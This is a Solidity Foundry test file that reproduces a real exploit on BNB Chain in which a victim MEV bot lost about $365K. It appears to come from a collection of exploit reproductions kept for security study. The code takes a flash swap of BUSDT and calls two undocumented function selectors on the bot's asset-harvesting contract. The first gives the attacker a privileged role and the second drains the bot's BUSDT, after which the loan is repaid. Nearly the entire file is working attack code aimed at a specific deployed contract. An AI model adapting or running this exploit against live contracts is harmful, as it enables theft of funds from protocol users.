// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~$365K
// Attacker : https://bscscan.com/address/0x69e068eb917115ed103278b812ec7541f021cea0
// Attack Contract : https://bscscan.com/address/0x3918e0d26b41134c006e8d2d7e3206a53b006108
// Victim Contract : https://bscscan.com/address/0x8c2d4ed92badb9b65f278efb8b440f4bc995ffe7
// Attack Tx : https://explorer.phalcon.xyz/tx/bsc/0x3dcb26a1f49eb4d02ca29960b4833bfb2e83d7b5d9591aed1204168944c8c9b3

// @Analysis
// https://twitter.com/Phalcon_xyz/status/1723897569661657553

contract ContractTest is Test {
    IERC20 private constant BUSDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    Uni_Pair_V2 private constant WBNB_BUSDT = Uni_Pair_V2(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE);
    address private constant victimMevBot = 0x8C2D4ed92Badb9b65f278EfB8b440F4BC995fFe7;
    address private constant assetHarvestingContract = 0x19a23DdAA47396335894229E0439D3D187D89eC9;

    function setUp() public {
        vm.createSelectFork("bsc", 33_435_892);
        vm.label(address(BUSDT), "BUSDT");
        vm.label(address(WBNB_BUSDT), "WBNB_BUSDT");
        vm.label(victimMevBot, "victimMevBot");
        vm.label(assetHarvestingContract, "assetHarvestingContract");
    }

    function testExploit() public {
        deal(address(BUSDT), address(this), 0);
        bytes memory data = abi.encode(assetHarvestingContract, victimMevBot);
        WBNB_BUSDT.swap(BUSDT.balanceOf(victimMevBot), 0, address(this), data);
    }

    function pancakeCall(address _sender, uint256 _amount0, uint256 _amount1, bytes calldata _data) external {
        // (address _assetHarvestingContract, address _victimMevBot) = abi.decode(
        //     _data,
        //     (address, address)
        // );
        BUSDT.approve(assetHarvestingContract, type(uint256).max);
        uint256 currentTimePlusOne = block.timestamp + 1;
        uint256 chainId;
        assembly {
            chainId := chainid()
        }
        // Start exploit
        // Use function with 0xac3994ec selector to designate privileged role for attacker in the victim contract
        designateRole(currentTimePlusOne, chainId);
        // Transfer BUSDT from victim to attacker
        harvestAssets(currentTimePlusOne, chainId);
        // End exploit

        BUSDT.approve(assetHarvestingContract, 0);

        // Repay BUSDT loan
        uint256 repayAmount = 1 + (3 * _amount0) / 997 + _amount0;
        BUSDT.transfer(address(WBNB_BUSDT), repayAmount);

        emit log_named_decimal_uint(
            "Attacker BUSDT balance after exploit", BUSDT.balanceOf(address(this)), BUSDT.decimals()
        );
    }

    function designateRole(uint256 time, uint256 chain) internal {
        (bool success,) = assetHarvestingContract.call(
            abi.encodeWithSelector(
                bytes4(0xac3994ec),
                BUSDT.balanceOf(address(this)),
                uint8(0),
                (time << 96) | ((chain << 64) & 0xffffffff0000000000000000),
                uint8(0),
                address(BUSDT),
                uint8(0),
                uint8(0),
                address(this)
            )
        );
        require(success, "Call to designateRole() fail");
    }

    function harvestAssets(uint256 time, uint256 chain) internal {
        (bool success,) = assetHarvestingContract.call(
            abi.encodeWithSelector(
                bytes4(0x1270d364),
                BUSDT.balanceOf(address(this)),
                uint8(0),
                (time << 96) | ((chain << 64) & 0xffffffff0000000000000000),
                uint8(0),
                address(BUSDT),
                uint8(0),
                uint8(0),
                victimMevBot,
                address(this),
                uint8(0)
            )
        );
        require(success, "Call to harvestAssets() fail");
    }
}
